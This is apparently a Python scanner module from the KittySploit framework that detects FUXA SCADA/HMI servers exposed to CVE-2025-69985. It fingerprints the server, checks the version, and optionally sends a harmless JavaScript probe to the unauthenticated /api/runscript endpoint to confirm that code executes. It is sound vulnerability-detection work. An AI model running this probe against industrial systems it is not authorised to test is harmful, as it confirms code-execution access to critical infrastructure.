#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):

    __info__ = {
        "name": "FUXA CVE-2025-69985 (auth bypass / runscript RCE) detection",
        "description": (
            "Detects FUXA web SCADA/HMI instances potentially affected by CVE-2025-69985 "
            "(unauthenticated /api/runscript). Combines fingerprinting, optional version "
            "heuristics (<= 1.2.8), and a safe runscript probe that does not invoke a shell."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2025-69985",
        "references": [
            "https://github.com/joshuavanderpoll/CVE-2025-69985",
            "https://github.com/frangoteam/FUXA",
        ],
        "modules": [
            "exploits/http/fuxa_cve_2025_69985_rce",
        ],
        "tags": ["web", "scanner", "fuxa", "scada", "cve-2025-69985", "rce"],
    }

    port = OptPort(1881, "Target port (FUXA default)", True)
    ssl = OptBool(False, "SSL enabled: true/false", True, advanced=True)
    base_path = OptString("/", "URL prefix if FUXA is behind a path", required=False)
    active_probe = OptBool(True, "POST harmless script to /api/runscript to confirm bypass", required=False)
    probe_marker = OptString("KS_FUXA_PROBE", "Marker returned by the passive JS probe", False, advanced=True)

    _VERSION_RE = re.compile(
        r'(?:version|fuxa)[^"\']{0,24}["\'](\d+\.\d+(?:\.\d+)?)["\']',
        re.IGNORECASE,
    )

    def _prefix(self) -> str:
        p = str(self.base_path or "/").strip()
        if not p.startswith("/"):
            p = "/" + p
        return p.rstrip("/") or ""

    def _api_path(self, suffix: str) -> str:
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        pre = self._prefix()
        return f"{pre}{suffix}" if pre else suffix

    def _origin(self) -> str:
        protocol = "https" if self.ssl else "http"
        return f"{protocol}://{self.target}:{self.port}".rstrip("/")

    @staticmethod
    def _version_tuple(version: str):
        parts = []
        for token in str(version).split("."):
            digits = "".join(ch for ch in token if ch.isdigit())
            parts.append(int(digits) if digits else 0)
        while len(parts) < 3:
            parts.append(0)
        return tuple(parts[:3])

    def _version_lte(self, version: str, limit: str = "1.2.8") -> bool:
        return self._version_tuple(version) <= self._version_tuple(limit)

    def _fingerprint_fuxa(self, body: str) -> bool:
        if not body:
            return False
        low = body.lower()
        return "fuxa" in low or "frangoteam" in low

    def _extract_version(self, body: str) -> str:
        if not body:
            return ""
        m = self._VERSION_RE.search(body)
        return m.group(1) if m else ""

    def _probe_script_body(self, marker: str) -> dict:
        js = f'return "{marker}_" + String(1 + 1);'
        return {
            "params": {
                "script": {
                    "parameters": [],
                    "mode": "",
                    "id": "scanner_probe",
                    "name": "scanner_probe",
                    "code": js,
                    "test": js,
                },
                "toLogEvent": False,
            }
        }

    def run(self):
        try:
            detected = False
            version = ""
            for path in (self._api_path("/fuxa"), self._api_path("/")):
                response = self.http_request(method="GET", path=path, allow_redirects=True, timeout=15)
                if not response or response.status_code != 200:
                    continue
                body = response.text or ""
                if self._fingerprint_fuxa(body):
                    detected = True
                    version = self._extract_version(body) or version
                    break

            if not detected:
                return False

            marker = str(self.probe_marker or "KS_FUXA_PROBE").strip() or "KS_FUXA_PROBE"
            origin = self._origin()
            headers = {
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*",
                "Referer": f"{origin}{self._prefix()}/fuxa",
            }

            if self.active_probe:
                probe = self._probe_script_body(marker)
                resp = self.http_request(
                    method="POST",
                    path=self._api_path("/api/runscript"),
                    json=probe,
                    headers=headers,
                    allow_redirects=False,
                    timeout=15,
                )
                if resp and resp.status_code == 200:
                    body_out = resp.text or ""
                    expected = f"{marker}_2"
                    if expected in body_out:
                        self.set_info(
                            severity="critical",
                            cve="CVE-2025-69985",
                            reason=(
                                "FUXA detected; unauthenticated /api/runscript executed probe JS "
                                f"(marker {expected!r}) — likely CVE-2025-69985"
                            ),
                        )
                        print_info(f"Active probe succeeded (marker found: {expected})")
                        return True

                self.set_info(
                    severity="medium",
                    cve="CVE-2025-69985",
                    reason=(
                        "FUXA detected but active runscript probe did not confirm the bypass "
                        f"(HTTP {getattr(resp, 'status_code', 'n/a')}). "
                        "Manual verification recommended."
                    ),
                )
                print_warning("FUXA fingerprint present; runscript probe inconclusive")
                return True

            if version and not self._version_lte(version, "1.2.8"):
                print_status(f"FUXA version hint {version} (> 1.2.8); likely patched for CVE-2025-69985")
                return False

            if version and self._version_lte(version, "1.2.8"):
                self.set_info(
                    severity="critical",
                    cve="CVE-2025-69985",
                    reason=f"FUXA version hint {version} (<= 1.2.8); active probe disabled — verify manually",
                )
                return True

            self.set_info(
                severity="medium",
                cve="CVE-2025-69985",
                reason="FUXA detected; version uncertain — enable ACTIVE_PROBE or verify manually",
            )
            return True
        except Exception as e:
            print_error(f"Scanner failed: {e}")
            return False
